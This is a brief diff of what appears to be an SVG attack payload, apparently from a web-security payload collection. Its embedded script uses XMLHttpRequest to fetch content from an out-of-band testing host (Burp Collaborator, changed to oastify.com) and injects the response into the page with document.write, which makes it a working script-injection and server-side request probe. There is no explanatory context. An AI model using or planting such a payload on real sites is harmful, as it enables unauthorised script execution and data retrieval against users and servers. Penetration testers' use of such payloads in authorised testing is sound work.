@@ -4,7 +4,7 @@
 x.onload=function(){
 document.write(this.responseText)
 };
-x.open("GET","https://312elodp3w3wzc4vpzk698dx7odg15.burpcollaborator.net");
+x.open("GET","https://4ejrcr545rdkw7jwt96grc1b228twjk8.oastify.com");
 x.send();
 </script>
 </svg>
